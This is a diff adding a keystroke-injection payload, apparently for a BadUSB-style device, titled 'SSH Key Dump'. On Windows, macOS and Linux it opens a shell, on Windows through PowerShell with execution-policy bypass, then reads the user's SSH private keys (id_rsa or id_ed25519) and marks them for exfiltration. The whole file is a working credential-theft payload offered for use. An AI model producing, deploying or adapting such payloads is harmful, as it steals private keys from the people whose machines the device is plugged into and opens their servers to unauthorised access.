@@ -1,0 +1,26 @@
+NAME SSH Key Dump
+DESCRIPTION Exfiltrates SSH private keys from the target
+CATEGORY credential
+PLATFORMS WIN,MAC,LINUX
+OPTION DELAY 2000 "Initial HID enumeration delay (ms)"
+PLATFORM WIN
+DELAY {{DELAY}}
+GUI r
+DELAY 800
+STRING powershell -nop -ep bypass
+ENTER
+DELAY 1200
+EXFIL if(Test-Path $env:USERPROFILE\.ssh\id_rsa){Get-Content $env:USERPROFILE\.ssh\id_rsa}elseif(Test-Path $env:USERPROFILE\.ssh\id_ed25519){Get-Content $env:USERPROFILE\.ssh\id_ed25519}else{Write-Output 'No SSH keys found'}
+PLATFORM MAC
+DELAY {{DELAY}}
+GUI SPACE
+DELAY 700
+STRING Terminal
+ENTER
+DELAY 1400
+EXFIL cat ~/.ssh/id_rsa 2>/dev/null || cat ~/.ssh/id_ed25519 2>/dev/null || echo 'No SSH keys found'
+PLATFORM LINUX
+DELAY {{DELAY}}
+CTRL ALT t
+DELAY 1400
+EXFIL cat ~/.ssh/id_rsa 2>/dev/null || cat ~/.ssh/id_ed25519 2>/dev/null || echo 'No SSH keys found'
